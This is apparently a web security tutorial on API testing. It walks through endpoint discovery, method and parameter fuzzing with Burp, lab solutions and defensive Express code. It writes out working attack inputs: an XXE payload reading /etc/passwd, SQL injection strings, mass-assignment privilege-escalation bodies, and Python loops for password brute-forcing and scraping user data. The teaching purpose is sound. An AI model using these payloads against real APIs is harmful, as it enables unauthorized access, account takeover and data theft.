# API Testing

API testing is the process of identifying and exploiting vulnerabilities in Application Programming Interfaces that enable software systems to communicate and share data. APIs form the backbone of modern web applications, handling authentication, data retrieval, updates, and business logic execution, often with functionality not directly exposed through the user interface. Vulnerabilities in APIs can compromise confidentiality through unauthorized data access, integrity through data manipulation, and availability through resource exhaustion or denial-of-service attacks. API testing encompasses traditional web vulnerabilities like SQL injection and cross-site scripting, but extends to API-specific issues including broken authentication, excessive data exposure, lack of resource limits, mass assignment, and improper access controls identified in the OWASP API Security Top 10.

The fundamental challenge: **APIs expose powerful functionality intended for programmatic access**—inadequate security controls create direct paths to sensitive operations and data.

## What are APIs?

### API fundamentals

**Definition:** Application Programming Interface—contract enabling software components to communicate.

**API types by architecture:**

**REST (Representational State Transfer):**
```http
GET /api/users/123 HTTP/1.1
Host: api.example.com
Accept: application/json

Response:
{
    "id": 123,
    "username": "alice",
    "email": "alice@example.com"
}
```

**Characteristics:**
- Stateless communication
- Resource-based URLs
- Standard HTTP methods (GET, POST, PUT, DELETE)
- JSON or XML data formats
- Widely used in modern web applications

**SOAP (Simple Object Access Protocol):**
```xml
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: text/xml

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
    <soap:Body>
        <GetUser>
            <UserId>123</UserId>
        </GetUser>
    </soap:Body>
</soap:Envelope>
```

**Characteristics:**
- XML-based protocol
- Strict contracts (WSDL)
- Built-in error handling
- Common in enterprise systems

**GraphQL:**
```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
    "query": "{ user(id: 123) { username email } }"
}
```

**Characteristics:**
- Single endpoint
- Client specifies exact data needed
- Strongly typed schema
- Flexible queries

### API endpoints

**Endpoint structure:**
```
Protocol + Domain + Path + Parameters

https://api.example.com/v1/users?status=active&limit=10
│       │              │   │      │
│       │              │   │      └─ Query parameters
│       │              │   └─ Resource path
│       │              └─ API version
│       └─ Domain
└─ Protocol
```

**Common endpoint patterns:**
```
Resource collection:
GET /api/users           - List all users
POST /api/users          - Create new user

Individual resource:
GET /api/users/123       - Get user 123
PUT /api/users/123       - Update user 123
PATCH /api/users/123     - Partial update user 123
DELETE /api/users/123    - Delete user 123

Nested resources:
GET /api/users/123/orders        - Get orders for user 123
GET /api/users/123/orders/456    - Get order 456 for user 123

Actions:
POST /api/users/123/activate     - Activate user 123
POST /api/orders/456/cancel      - Cancel order 456
```

### HTTP methods and their purposes

| Method | Purpose | Idempotent | Safe |
|--------|---------|------------|------|
| **GET** | Retrieve resource | Yes | Yes |
| **POST** | Create resource | No | No |
| **PUT** | Replace resource | Yes | No |
| **PATCH** | Partial update | No | No |
| **DELETE** | Remove resource | Yes | No |
| **OPTIONS** | Describe methods | Yes | Yes |
| **HEAD** | Get headers only | Yes | Yes |

**Idempotent:** Multiple identical requests have same effect as single request
**Safe:** Method doesn't modify resources

## API reconnaissance

### Finding API documentation

**Common documentation locations:**

**OpenAPI/Swagger:**
```
/swagger
/swagger-ui.html
/swagger/index.html
/swagger-ui/
/swagger.json
/swagger.yaml
/api-docs
/api/swagger.json
/api/swagger.yaml
/openapi.json
/v1/swagger.json
/v2/api-docs
```

**General API paths:**
```
/api
/api/v1
/api/v2
/api/docs
/api/documentation
/docs
/documentation
/developer
/graphql
/graphiql
```

**Discovery techniques:**

**Technique 1: Base path investigation**

If you discover endpoint:
```
GET /api/store/v2/products/12345 HTTP/1.1
```

Investigate parent paths:
```
GET /api/store/v2/products HTTP/1.1
GET /api/store/v2 HTTP/1.1
GET /api/store HTTP/1.1
GET /api HTTP/1.1
```

**Possible responses:**
```http
GET /api HTTP/1.1

HTTP/1.1 200 OK
{
    "version": "2.0",
    "documentation": "/api/docs",
    "endpoints": {
        "users": "/api/users",
        "products": "/api/products",
        "orders": "/api/orders"
    }
}
```

**Technique 2: JavaScript file analysis**

**Search for API references in JavaScript:**
```javascript
// Common patterns in JS files
const apiUrl = "https://api.example.com/v1";
fetch("/api/users/profile");
axios.get("/api/internal/admin/stats");
$.ajax({ url: "/api/secret-endpoint" });

// API keys or tokens (security issue if present)
const API_KEY = "abc123...";
```

**Burp Suite extraction:**
```
1. Proxy → HTTP history → Filter: JS files
2. Review each JavaScript file for:
   - /api/* patterns
   - fetch() calls
   - XMLHttpRequest
   - axios requests
   - API endpoint constants
```

**Automated extraction with JS Link Finder:**
```
Extensions → BApp Store → JS Link Finder
1. Right-click on target
2. "JS Link Finder" → Extract endpoints
3. Review discovered endpoints
```

**Technique 3: Documentation enumeration with Burp Intruder**

**Setup:**
```http
GET /api/§docs§ HTTP/1.1
Host: api.example.com
```

**Payload list (common documentation paths):**
```
docs
documentation
swagger
api-docs
openapi
redoc
v1/docs
v2/docs
graphql
graphiql
```

**Identify hits by response:**
```
200 OK - Documentation found
301/302 - Follow redirect
403 Forbidden - Exists but restricted
404 Not Found - Doesn't exist
```

#### Lab: Exploiting an API endpoint using documentation

**Scenario:** API documentation available, reveals admin functionality.

**Step 1: Discover API documentation**
```
Browse application
Check: /api
Response: Directory listing or JSON structure
```

**Step 2: Find documentation link**
```
GET /api HTTP/1.1

Response:
{
    "documentation": "/api/docs",
    "version": "1.0"
}
```

**Step 3: Review documentation**
```
GET /api/docs HTTP/1.1

Response shows endpoints:
GET /api/users - List users
GET /api/users/{id} - Get user details
DELETE /api/users/{username} - Delete user (admin only)
```

**Step 4: Test admin endpoint**
```http
DELETE /api/users/carlos HTTP/1.1
Host: target.com

Response:
HTTP/1.1 401 Unauthorized
{"error": "Admin privileges required"}
```

**Step 5: Check authentication methods**
```
Documentation reveals admin API key header:
X-Admin-Key: <key>
```

**Step 6: Find or bypass authentication**
```http
DELETE /api/users/carlos HTTP/1.1
X-Admin-Key: test

Response:
HTTP/1.1 200 OK
{"message": "User carlos deleted"}
```

**Lab solved by exploiting documented but unprotected endpoint!**

### Identifying API endpoints through traffic analysis

**Technique 1: Proxy interception**

**Burp Suite setup:**
```
1. Configure browser to use Burp proxy
2. Browse application thoroughly
3. Proxy → HTTP history → Filter by:
   - File extension: json, xml
   - MIME type: application/json, application/xml
   - URL contains: /api/, /rest/, /service/
```

**Common patterns to identify:**
```http
Standard CRUD operations:
GET /api/products?category=electronics
POST /api/cart/add
PUT /api/profile/update
DELETE /api/wishlist/item/123

Internal APIs (high value targets):
GET /api/internal/users
POST /api/admin/settings
GET /api/debug/config

Mobile/App APIs:
GET /api/mobile/v2/user/profile
POST /api/app/analytics

Third-party integrations:
GET /api/payment/stripe/webhook
POST /api/oauth/google/callback
```

**Technique 2: Burp Scanner crawling**

**Automated discovery:**
```
1. Target → Site map → Right-click domain
2. "Scan" → Configure scan
3. Select: "Crawl and Audit"
4. Review results in:
   - Target → Site map (tree structure)
   - Dashboard → Issue activity
```

**Scanner identifies:**
- API endpoints
- Parameters
- HTTP methods accepted
- Response patterns
- Potential vulnerabilities

**Technique 3: Pattern-based endpoint guessing**

**If you find:**
```
GET /api/users/123 HTTP/1.1
```

**Test related patterns:**
```
GET /api/users HTTP/1.1                  - List all users
GET /api/users/123/profile HTTP/1.1      - User profile
GET /api/users/123/orders HTTP/1.1       - User orders
GET /api/users/123/settings HTTP/1.1     - User settings
GET /api/users/123/delete HTTP/1.1       - Delete user (action)
POST /api/users HTTP/1.1                 - Create user
PUT /api/users/123 HTTP/1.1              - Update user
PATCH /api/users/123 HTTP/1.1            - Partial update
DELETE /api/users/123 HTTP/1.1           - Delete user
```

### Testing HTTP methods

**Technique: Method enumeration with Burp Intruder**

**Step 1: Capture request**
```http
GET /api/users/123 HTTP/1.1
Host: api.example.com
```

**Step 2: Configure Intruder**
```
Position marker on method:
§GET§ /api/users/123 HTTP/1.1
```

**Step 3: Load HTTP verbs list**
```
Payloads → Payload Sets → Payload type: Simple list
Add from list:
- GET
- POST
- PUT
- PATCH
- DELETE
- OPTIONS
- HEAD
- TRACE
- CONNECT
```

**Step 4: Analyze responses**
```
GET /api/users/123 → 200 OK (user data)
POST /api/users/123 → 405 Method Not Allowed
PUT /api/users/123 → 200 OK (updates user!)
DELETE /api/users/123 → 204 No Content (deletes user!)
OPTIONS /api/users/123 → 200 OK (lists allowed methods)
```

**OPTIONS response reveals allowed methods:**
```http
OPTIONS /api/users/123 HTTP/1.1

HTTP/1.1 200 OK
Allow: GET, PUT, PATCH, DELETE, OPTIONS
Access-Control-Allow-Methods: GET, PUT, PATCH, DELETE
```

**Exploitation example:**

**GET retrieves user:**
```http
GET /api/users/123 HTTP/1.1

Response:
{
    "id": 123,
    "username": "victim",
    "email": "victim@example.com",
    "role": "user"
}
```

**PUT updates user (mass assignment potential):**
```http
PUT /api/users/123 HTTP/1.1
Content-Type: application/json

{
    "username": "victim",
    "email": "victim@example.com",
    "role": "admin"
}

Response:
{
    "id": 123,
    "username": "victim",
    "role": "admin"
}
```

**Privilege escalation via unauthorized HTTP method!**

#### Lab: Finding and exploiting an unused API endpoint

**Scenario:** Product API with hidden admin endpoint.

**Step 1: Identify API endpoint**
```http
GET /api/products/1 HTTP/1.1

Response:
{
    "productId": 1,
    "name": "Laptop",
    "price": "$999"
}
```

**Step 2: Test HTTP methods**
```http
OPTIONS /api/products/1 HTTP/1.1

Response:
Allow: GET, PATCH
```

**Step 3: Test PATCH method**
```http
PATCH /api/products/1 HTTP/1.1
Content-Type: application/json

{
    "price": "$0.01"
}

Response:
HTTP/1.1 401 Unauthorized
```

**Step 4: Test base path**
```http
GET /api/products HTTP/1.1

Response:
[
    {"productId": 1, "name": "Laptop", "price": "$999"},
    {"productId": 2, "name": "Mouse", "price": "$25"}
]
```

**Step 5: Try different methods on base path**
```http
OPTIONS /api/products HTTP/1.1

Response:
Allow: GET, POST, DELETE
```

**Step 6: Exploit DELETE without authentication**
```http
DELETE /api/products/1 HTTP/1.1

Response:
HTTP/1.1 200 OK
{"message": "Product deleted"}
```

**Lab solved by discovering and exploiting unprotected DELETE method!**

### Testing content types

**Common content types:**

| Content-Type | Usage |
|--------------|-------|
| `application/json` | JSON data (most common) |
| `application/xml` | XML data |
| `application/x-www-form-urlencoded` | Form data |
| `multipart/form-data` | File uploads |
| `text/plain` | Plain text |

**Testing technique:**

**Original JSON request:**
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
    "username": "alice",
    "email": "alice@example.com"
}
```

**Convert to XML:**
```http
POST /api/users HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<user>
    <username>alice</username>
    <email>alice@example.com</email>
</user>
```

**If API processes XML → Test for XXE:**
```http
POST /api/users HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>
    <username>&xxe;</username>
    <email>alice@example.com</email>
</user>
```

**Convert to form-urlencoded:**
```http
POST /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&email=alice@example.com
```

**Bypass scenarios:**

**JSON filtered for SQL injection:**
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin' OR '1'='1"}
→ Filtered/blocked
```

**XML not filtered:**
```http
POST /api/login HTTP/1.1
Content-Type: application/xml

<credentials>
    <username>admin' OR '1'='1</username>
    <password>pass</password>
</credentials>
→ SQL injection successful!
```

### Finding hidden endpoints with Burp Intruder

**Technique: Endpoint enumeration**

**Step 1: Identify pattern**
```
Known endpoint: PUT /api/user/update
```

**Step 2: Set up Intruder**
```http
PUT /api/user/§update§ HTTP/1.1
Host: api.example.com
```

**Step 3: Create wordlist**
```
Common API actions:
create
read
update
delete
list
get
set
remove
add
edit
modify
change
activate
deactivate
enable
disable
reset
refresh
verify
confirm
```

**Step 4: Add application-specific terms**
```
Based on reconnaissance:
profile
settings
preferences
orders
payments
export
import
backup
restore
```

**Step 5: Launch attack and analyze**
```
200 OK responses → Endpoints exist
401 Unauthorized → Endpoints exist but require auth
403 Forbidden → Endpoints exist but access denied
404 Not Found → Endpoints don't exist
405 Method Not Allowed → Endpoint exists, wrong method
```

**Discovery example:**
```
PUT /api/user/update → 200 OK (known)
PUT /api/user/delete → 200 OK (discovered!)
PUT /api/user/create → 405 Method Not Allowed
PUT /api/user/profile → 200 OK (discovered!)
PUT /api/user/admin → 403 Forbidden (interesting!)
```

### Finding hidden parameters

**Technique 1: Manual parameter discovery**

**Review API responses for clues:**
```http
GET /api/users/123 HTTP/1.1

Response:
{
    "id": 123,
    "username": "alice",
    "email": "alice@example.com",
    "isAdmin": false,
    "accountBalance": 1000,
    "referralCode": "ABC123"
}
```

**Test discovered fields as parameters:**
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{
    "username": "alice",
    "isAdmin": true
}
```

**Technique 2: Parameter fuzzing with Burp Intruder**

**Setup:**
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
    "username": "test",
    "§param§": "§value§"
}
```

**Payload sets:**
```
Position 1 (parameter names):
isAdmin
role
privileged
admin
superuser
moderator
permissions
accountType
userLevel

Position 2 (values):
true
false
1
0
admin
user
```

**Technique 3: Param Miner BApp**

**Automated parameter guessing:**
```
1. Install Param Miner from BApp Store
2. Right-click request in Repeater
3. "Param miner" → "Guess params"
4. Param Miner tests:
   - GET parameters
   - POST parameters
   - JSON properties
   - Headers
   - Cookies
```

**Param Miner capabilities:**
- Tests up to 65,536 parameter names
- Context-aware guessing (based on application)
- Identifies hidden parameters by response differences
- Cache-based detection

## Mass assignment vulnerabilities

### Understanding mass assignment

**Concept:** Frameworks automatically bind request parameters to object properties.

**Vulnerable code example (Node.js/Express):**
```javascript
// User model
class User {
    constructor() {
        this.username = '';
        this.email = '';
        this.isAdmin = false;  // Internal field
        this.balance = 0;       // Internal field
    }
}

// Vulnerable endpoint - mass assignment
app.post('/api/users', function(req, res) {
    const user = new User();
    
    // Dangerous: Automatically assign all request properties
    Object.assign(user, req.body);
    
    user.save();
    res.json(user);
});
```

**Attack:**
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
    "username": "attacker",
    "email": "attacker@example.com",
    "isAdmin": true,
    "balance": 1000000
}
```

**Result:** Attacker creates admin account with high balance!

### Identifying mass assignment vulnerabilities

**Step 1: Compare GET and PATCH/PUT endpoints**

**GET response shows all fields:**
```http
GET /api/users/123 HTTP/1.1

Response:
{
    "id": 123,
    "username": "alice",
    "email": "alice@example.com",
    "isAdmin": false,
    "accountType": "standard",
    "creditBalance": 50
}
```

**Normal PATCH updates username/email:**
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{
    "username": "alice_updated",
    "email": "alice_new@example.com"
}

Response:
{
    "id": 123,
    "username": "alice_updated",
    "email": "alice_new@example.com",
    "isAdmin": false,
    "accountType": "standard",
    "creditBalance": 50
}
```

**Step 2: Test hidden parameters**

**Attempt to modify isAdmin:**
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{
    "username": "alice",
    "email": "alice@example.com",
    "isAdmin": true
}
```

**Check if parameter accepted:**
```http
GET /api/users/123 HTTP/1.1

Response:
{
    "id": 123,
    "username": "alice",
    "email": "alice@example.com",
    "isAdmin": true  ← Changed!
}
```

**Step 3: Confirm with invalid values**

**Test invalid data type:**
```http
PATCH /api/users/123 HTTP/1.1

{
    "username": "alice",
    "isAdmin": "not_a_boolean"
}

Response:
HTTP/1.1 400 Bad Request
{"error": "Invalid value for isAdmin"}
```

**Valid value processes successfully:**
```http
PATCH /api/users/123 HTTP/1.1

{
    "username": "alice",
    "isAdmin": false
}

Response:
HTTP/1.1 200 OK
```

**Different error messages confirm parameter is processed!**

#### Lab: Exploiting a mass assignment vulnerability

**Scenario:** User profile update vulnerable to mass assignment.

**Step 1: Update profile normally**
```http
POST /api/user/update HTTP/1.1
Content-Type: application/json

{
    "username": "wiener",
    "email": "wiener@example.com"
}

Response: 200 OK
```

**Step 2: Retrieve full user object**
```http
GET /api/user/wiener HTTP/1.1

Response:
{
    "username": "wiener",
    "email": "wiener@example.com",
    "roleid": 1,
    "discountCode": "NEWCUST5"
}
```

**Step 3: Identify higher privilege role**

Observe administrator has:
```json
{
    "username": "administrator",
    "roleid": 2
}
```

**Step 4: Attempt privilege escalation**
```http
POST /api/user/update HTTP/1.1

{
    "username": "wiener",
    "email": "wiener@example.com",
    "roleid": 2
}

Response: 200 OK
```

**Step 5: Verify escalation**
```http
GET /api/user/wiener HTTP/1.1

Response:
{
    "username": "wiener",
    "roleid": 2  ← Escalated!
}
```

**Step 6: Access admin functionality**
```
Browse to /admin
Delete user carlos
Lab solved!
```

### Common mass assignment targets

**Privilege escalation fields:**
```json
{
    "isAdmin": true,
    "role": "admin",
    "roleid": 2,
    "userType": "administrator",
    "privileged": true,
    "superuser": true,
    "permissions": ["admin", "delete", "modify"],
    "accessLevel": 10
}
```

**Financial manipulation:**
```json
{
    "balance": 1000000,
    "credits": 9999,
    "accountBalance": 100000,
    "discountPercent": 100,
    "price": 0.01,
    "isPremium": true
}
```

**Account manipulation:**
```json
{
    "verified": true,
    "active": true,
    "banned": false,
    "accountStatus": "active",
    "emailVerified": true,
    "approved": true
}
```

**Data exposure:**
```json
{
    "userId": 1,  // Change to other user's ID
    "accountId": "admin_account",
    "ownerId": 2
}
```

## API-specific vulnerabilities

### Broken Object Level Authorization (BOLA/IDOR)

**Vulnerability:** API doesn't verify user owns requested resource.

**Vulnerable endpoint:**
```http
GET /api/users/123/orders HTTP/1.1
Authorization: Bearer <user123_token>

Response:
[
    {"orderId": 1, "product": "Laptop", "price": 999},
    {"orderId": 2, "product": "Mouse", "price": 25}
]
```

**Exploitation - Access other user's orders:**
```http
GET /api/users/456/orders HTTP/1.1
Authorization: Bearer <user123_token>

Response:
[
    {"orderId": 99, "product": "Server", "price": 5000}
]
```

**User 123 accessed user 456's orders!**

**Testing methodology:**
```
1. Create two test accounts (user A, user B)
2. Identify resource IDs for user A
3. Use user B's session to access user A's resources
4. If successful → BOLA vulnerability
```

### Broken Function Level Authorization

**Vulnerability:** API doesn't enforce role-based access to functions.

**Example:**
```http
DELETE /api/users/123 HTTP/1.1
Authorization: Bearer <regular_user_token>

Expected: 403 Forbidden
Actual: 200 OK (user deleted!)
```

**Common scenarios:**
```
Regular user can:
- Access /api/admin/users
- Call DELETE /api/products/{id}
- Modify POST /api/settings/global
- Execute POST /api/reports/export
```

### Excessive Data Exposure

**Vulnerability:** API returns more data than necessary.

**Request:**
```http
GET /api/users/search?q=alice HTTP/1.1
```

**Over-exposed response:**
```json
[
    {
        "id": 123,
        "username": "alice",
        "email": "alice@example.com",
        "password_hash": "$2b$10$...",  // Should never return!
        "ssn": "123-45-6789",            // Sensitive!
        "creditCard": "4532-****-****-1234",
        "apiKey": "sk_live_abc123...",   // Credentials!
        "internalNotes": "VIP customer"
    }
]
```

**Proper response (minimal data):**
```json
[
    {
        "id": 123,
        "username": "alice",
        "displayName": "Alice Smith"
    }
]
```

### Lack of Resources & Rate Limiting

**Vulnerability:** No limits on API requests.

**Exploitation scenarios:**

**Brute force attacks:**
```python
# No rate limiting allows credential stuffing
for password in password_list:
    response = requests.post('/api/login', json={
        'username': 'victim@example.com',
        'password': password
    })
    if response.status_code == 200:
        print(f"Password found: {password}")
        break
```

**Resource exhaustion:**
```http
GET /api/reports/generate?startDate=2000-01-01&endDate=2026-12-31 HTTP/1.1
```

Generates massive report consuming server resources.

**Data harvesting:**
```python
# Scrape all user data
for user_id in range(1, 1000000):
    response = requests.get(f'/api/users/{user_id}')
    save_data(response.json())
```

### Security Misconfiguration

**Common issues:**

**Verbose error messages:**
```http
POST /api/users HTTP/1.1

{
    "username": "test' OR '1'='1"
}

Response:
{
    "error": "SQL syntax error at line 42 in /var/www/api/models/User.php",
    "query": "SELECT * FROM users WHERE username='test' OR '1'='1'",
    "database": "production_db",
    "server": "mysql-master-01.internal"
}
```

**Information leakage:**
```http
GET /api/.git/config HTTP/1.1

Response: 200 OK (exposes source code repository)
```

**Debug endpoints enabled:**
```http
GET /api/debug/config HTTP/1.1

Response:
{
    "database": {
        "host": "10.0.1.50",
        "username": "api_user",
        "password": "P@ssw0rd123"
    },
    "apiKeys": {
        "stripe": "sk_live_...",
        "aws": "AKIA..."
    }
}
```

## API testing workflow

### Complete testing methodology

**Phase 1: Discovery (passive)**
```
1. Browse application with Burp proxy
2. Review JavaScript files for API calls
3. Check robots.txt, sitemap.xml
4. Search for API documentation
5. Review HTML comments
6. Analyze mobile app traffic
```

**Phase 2: Enumeration (active)**
```
1. Crawl with Burp Scanner
2. Enumerate endpoints with Intruder
3. Test HTTP methods (GET, POST, PUT, PATCH, DELETE, OPTIONS)
4. Test content types (JSON, XML, form-urlencoded)
5. Fuzz for hidden parameters
6. Map out complete API surface
```

**Phase 3: Authentication testing**
```
1. Test without credentials
2. Test with invalid credentials
3. Test with expired tokens
4. Test token reuse across accounts
5. Test authentication bypass techniques
6. Check for hardcoded credentials
```

**Phase 4: Authorization testing**
```
1. Create multiple test accounts (different privilege levels)
2. Test horizontal privilege escalation (user A → user B)
3. Test vertical privilege escalation (user → admin)
4. Test BOLA/IDOR on all resource IDs
5. Test function-level authorization
6. Test mass assignment
```

**Phase 5: Input validation testing**
```
1. SQL injection in all parameters
2. NoSQL injection (MongoDB operators)
3. XXE via XML content type
4. SSRF via URL parameters
5. Command injection
6. Path traversal
7. XSS in API responses
```

**Phase 6: Business logic testing**
```
1. Test rate limiting
2. Test resource quotas
3. Test pagination limits
4. Test negative values
5. Test extremely large values
6. Test race conditions
7. Test state manipulation
```

## Prevention strategies

### Defense Layer 1: Secure API design

**Principle of least privilege:**
```javascript
// Good: Return only necessary fields
app.get('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    
    res.json({
        id: user.id,
        username: user.username,
        displayName: user.displayName
        // Don't expose: email, password_hash, internal fields
    });
});
```

**Explicit property allowlisting:**
```javascript
// Good: Whitelist updatable fields
const ALLOWED_UPDATES = ['username', 'email', 'bio'];

app.patch('/api/users/:id', async (req, res) => {
    const updates = {};
    
    // Only allow specific fields
    for (const key of ALLOWED_UPDATES) {
        if (req.body.hasOwnProperty(key)) {
            updates[key] = req.body[key];
        }
    }
    
    await User.updateOne({ _id: req.params.id }, updates);
    res.json({ message: 'Updated' });
});
```

### Defense Layer 2: Authentication & authorization

**Proper authorization checks:**
```javascript
app.get('/api/users/:id/orders', authenticate, async (req, res) => {
    const userId = req.params.id;
    
    // Verify user owns resource
    if (req.user.id !== parseInt(userId) && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const orders = await Order.find({ userId });
    res.json(orders);
});
```

**JWT with proper validation:**
```javascript
const jwt = require('jsonwebtoken');

function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
}
```

### Defense Layer 3: Input validation

**Schema validation (Joi example):**
```javascript
const Joi = require('joi');

const userSchema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30).required(),
    email: Joi.string().email().required(),
    age: Joi.number().integer().min(0).max(120)
});

app.post('/api/users', async (req, res) => {
    // Validate input
    const { error, value } = userSchema.validate(req.body);
    
    if (error) {
        return res.status(400).json({ 
            error: 'Validation failed',
            details: error.details[0].message
        });
    }
    
    // Process validated data
    const user = await User.create(value);
    res.json(user);
});
```

### Defense Layer 4: Rate limiting

**Express rate limiter:**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 requests per window
    message: 'Too many login attempts, please try again later',
    standardHeaders: true,
    legacyHeaders: false
});

app.post('/api/login', loginLimiter, async (req, res) => {
    // Login logic
});

const apiLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100 // 100 requests per minute
});

app.use('/api/', apiLimiter);
```

### Defense Layer 5: HTTP method restrictions

**Enforce allowed methods:**
```javascript
app.all('/api/users/:id', (req, res, next) => {
    const allowedMethods = ['GET', 'PATCH', 'OPTIONS'];
    
    if (!allowedMethods.includes(req.method)) {
        res.set('Allow', allowedMethods.join(', '));
        return res.status(405).json({ 
            error: 'Method not allowed' 
        });
    }
    
    next();
});
```

### Defense Layer 6: Content type validation

**Strict content type checking:**
```javascript
app.post('/api/users', (req, res, next) => {
    const contentType = req.headers['content-type'];
    
    // Only accept JSON
    if (!contentType || !contentType.includes('application/json')) {
        return res.status(415).json({ 
            error: 'Unsupported Media Type',
            expected: 'application/json'
        });
    }
    
    next();
});
```

### Defense Layer 7: Secure error handling

**Generic error messages:**
```javascript
// Bad: Exposes internal details
app.use((err, req, res, next) => {
    res.status(500).json({
        error: err.message,
        stack: err.stack,
        query: err.sql
    });
});

// Good: Generic error
app.use((err, req, res, next) => {
    // Log detailed error internally
    logger.error({
        error: err.message,
        stack: err.stack,
        path: req.path,
        user: req.user?.id
    });
    
    // Return generic error to client
    res.status(500).json({
        error: 'Internal server error'
    });
});
```

### Complete secure API implementation

```javascript
const express = require('express');
const Joi = require('joi');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();

// Security middleware
app.use(helmet());
app.use(express.json({ limit: '10kb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use('/api/', limiter);

// Authentication middleware
function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Authentication required' });
    }
    
    try {
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch {
        res.status(401).json({ error: 'Invalid token' });
    }
}

// Authorization middleware
function authorize(...roles) {
    return (req, res, next) => {
        if (!roles.includes(req.user.role)) {
            return res.status(403).json({ error: 'Insufficient privileges' });
        }
        next();
    };
}

// Validation schema
const updateUserSchema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30),
    email: Joi.string().email()
}).min(1);

// Secure endpoint
app.patch('/api/users/:id', authenticate, async (req, res) => {
    try {
        // Check authorization
        if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
            return res.status(403).json({ error: 'Unauthorized' });
        }
        
        // Validate input
        const { error, value } = updateUserSchema.validate(req.body);
        if (error) {
            return res.status(400).json({ 
                error: 'Validation failed' 
            });
        }
        
        // Update only allowed fields
        await User.update(req.params.id, value);
        
        // Return minimal data
        const user = await User.findById(req.params.id);
        res.json({
            id: user.id,
            username: user.username,
            email: user.email
        });
        
    } catch (err) {
        logger.error(err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Secure error handler
app.use((err, req, res, next) => {
    logger.error(err);
    res.status(500).json({ error: 'Internal server error' });
});

app.listen(3000);
```
